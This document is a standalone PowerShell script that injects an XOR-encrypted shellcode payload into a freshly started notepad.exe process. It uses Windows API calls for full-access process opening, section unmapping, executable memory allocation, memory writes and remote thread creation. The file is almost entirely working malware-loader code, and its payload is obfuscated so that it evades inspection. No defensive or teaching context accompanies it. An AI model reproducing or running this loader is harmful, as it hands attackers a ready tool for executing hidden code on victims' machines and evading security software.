$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
}
"@

Add-Type $Kernel32

# XOR decryption key
[Byte[]] $XORkey = 0xf0, 0x3b, 0x83, 0xfb, 0xda, 0x9e, 0xe4, 0xa4, 0x0d, 0x9c, 0x57, 0x23, 0xfe, 0x4f, 0xab, 0xdf

# Encrypted shellcode
[Byte[]] $XORshellcode = 0x0c, 0x73, 0x00, 0x1f, 0x2a, 0x76, 0x24, 0xa4, 0x0d, 0x9c, 0x16, 0x72, 0xbf, 0x1f, 0xf9, 0x8e, 0xa6, 0x73, 0xb2, 0x29, 0xbf, 0xd6, 0x6f, 0xf6, 0x6d, 0xd4, 0xdc, 0x71, 0xe6, 0x07, 0x20, 0x8d, 0xd0, 0x73, 0x08, 0x89, 0x8a, 0xd6, 0xeb, 0x13, 0x47, 0xd6, 0x1a, 0x12, 0x37, 0x07, 0x9a, 0x1f, 0x5c, 0x07, 0xe2, 0x87, 0xd8, 0xb2, 0xc4, 0xe5, 0xcc, 0x55, 0x5a, 0x62, 0xff, 0x8e, 0x49, 0x32, 0xa2, 0x7a, 0xd2, 0xb3, 0x51, 0xcc, 0xc4, 0x2f, 0x4f, 0xa0, 0x1f, 0x22, 0x2e, 0xc4, 0x2b, 0x57, 0xf0, 0x3b, 0x83, 0xb3, 0x5f, 0x5e, 0x90, 0xc3, 0x45, 0x9d, 0x87, 0x73, 0x75, 0x07, 0xb3, 0x9b, 0x7b, 0x7b, 0xa3, 0xb2, 0xdb, 0x4e, 0x07, 0xf2, 0x45, 0x63, 0x9e, 0x62, 0x75, 0x7b, 0x23, 0x97, 0xf1, 0xed, 0xce, 0xca, 0x13, 0xd6, 0xd5, 0x64, 0xa1, 0xdd, 0x96, 0xea, 0xf3, 0x0e, 0xaa, 0x1e, 0xc8, 0xdb, 0xf6, 0x0a, 0x96, 0x9d, 0xa8, 0x80, 0x05, 0xd9, 0x6e, 0xf2, 0x8b, 0x97, 0xf3, 0x9b, 0x7b, 0x7b, 0xa7, 0xb2, 0xdb, 0x4e, 0x82, 0xe5, 0x86, 0x90, 0x1f, 0x67, 0x75, 0x0f, 0xb7, 0x96, 0xf1, 0xeb, 0xc2, 0x70, 0xde, 0x16, 0xac, 0xa5, 0xdd, 0xdd, 0x0f, 0x62, 0xa6, 0x11, 0xf2, 0x85, 0xb1, 0x63, 0xc2, 0xa2, 0x9b, 0xc4, 0xac, 0x27, 0xe1, 0xbc, 0x16, 0x71, 0x01, 0xaf, 0xf3, 0x9e, 0xa9, 0x61, 0xcb, 0x70, 0xc8, 0x77, 0xb3, 0x5b, 0xf2, 0x63, 0x0a, 0x6a, 0x40, 0x38, 0xd8, 0xed, 0xaf, 0x08, 0xb1, 0xfb, 0xda, 0xdf, 0xb2, 0xed, 0x84, 0x7a, 0x1f, 0xa2, 0x12, 0xef, 0xaa, 0xdf, 0xf0, 0x72, 0x0a, 0x1e, 0x93, 0x22, 0xe6, 0xa4, 0x13, 0xfd, 0x97, 0x8b, 0x68, 0xcf, 0xea, 0x8b, 0xb9, 0xb2, 0x67, 0xb7, 0x53, 0x6f, 0xa5, 0x1e, 0x41, 0xeb, 0x71, 0x24, 0x01, 0x9a, 0xe7, 0x56, 0x1a, 0x53, 0x82, 0xfa, 0xda, 0x9e, 0xbd, 0xe5, 0xb7, 0xb5, 0xd7, 0x48, 0xfe, 0xb0, 0x7e, 0x8f, 0xa0, 0x76, 0xb2, 0x32, 0x97, 0xaf, 0x24, 0xec, 0xf2, 0x5c, 0x1f, 0xaa, 0x3c, 0x07, 0x54, 0x1f, 0xb8, 0xb2, 0x42, 0xba, 0x60, 0x74, 0xeb, 0x7b, 0xed, 0x63, 0x82, 0x6b, 0x77, 0x88, 0xc1, 0xcf, 0xb1, 0x63, 0xcf, 0x72, 0x38, 0xd6, 0x6d, 0x5d, 0x4c, 0x26, 0xce, 0x86, 0x8a, 0x2e, 0x54, 0x0a, 0xb8, 0xba, 0x47, 0xbb, 0xd8, 0x9e, 0xe4, 0xed, 0xb5, 0xff, 0x3a, 0x47, 0xfe, 0x4f, 0xab, 0xdf, 0xf0, 0x7a, 0xd3, 0xba, 0x8a, 0xd6, 0x6d, 0x46, 0x5a, 0xcb, 0x00, 0x6e, 0xcf, 0x8f, 0xc1, 0xd2, 0xa9, 0x7a, 0xd3, 0x19, 0x26, 0xf8, 0x23, 0xe0, 0x29, 0xc8, 0x56, 0x22, 0xb6, 0xc2, 0xef, 0xfb, 0xe8, 0xfd, 0x83, 0x93, 0x92, 0x17, 0x02, 0xf2, 0x5d, 0xdd, 0x07, 0x62, 0xae, 0x0e, 0xfb, 0x96, 0x0f, 0xfb, 0xc2, 0xab, 0x93, 0x61, 0x2c, 0xe9, 0x84, 0x5d, 0x1b, 0xaa, 0x3f, 0x0e, 0x11, 0xa6, 0x3c, 0x04, 0x05, 0x04, 0x0f, 0xd6, 0xd5, 0x76, 0x45, 0x63, 0x9d, 0xa8, 0xf0, 0x0e, 0x11, 0xd7, 0x77, 0x26, 0xe3, 0x04, 0x0f, 0x25, 0x14, 0x11, 0xaf, 0xca, 0x16, 0x99, 0x58, 0xda, 0x16, 0x42, 0x0f, 0xee, 0xcb, 0x78, 0x1e, 0xb6, 0xd8, 0xa2, 0x71, 0x96, 0xd7, 0xd8, 0x1e, 0x3a, 0xae, 0x64, 0xb7, 0x28, 0xf1, 0x94, 0xb0, 0x9e, 0xbd, 0xe5, 0x84, 0x46, 0xa8, 0xf6


# Target process to hollow
$processName = "notepad.exe"

# Start target process in suspended state
$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.FileName = "c:\windows\system32\notepad.exe"
$processInfo.CreateNoWindow = $true
$processInfo.UseShellExecute = $false
$process = [System.Diagnostics.Process]::Start($processInfo)

# Get handle to target process
$PROCESS_ALL_ACCESS = 0x1F0FFF
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $process.Id)

# Unmap the target process's memory (if needed)
[Kernel32]::ZwUnmapViewOfSection($hProcess, [IntPtr]::Zero)

# Allocate memory for the shellcode in the target process
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40
$size = $XORshellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

for ($i = 0; $i -lt $XORshellcode.Length; $i++) {
    $XORshellcode[$i] = $XORshellcode[$i] -bxor $XORkey[$i % $XORkey.Length]
}

# Write the decrypted shellcode into the allocated memory
[UIntPtr]$bytesWritten = [UIntPtr]::Zero
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $XORshellcode, $size, [ref]$bytesWritten)


# Create a remote thread to execute the shellcode
$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)


Write-Host "Letsss goooo Broskiiiii" -ForegroundColor Green

# Clean up
[Kernel32]::CloseHandle($hThread)
[Kernel32]::CloseHandle($hProcess)
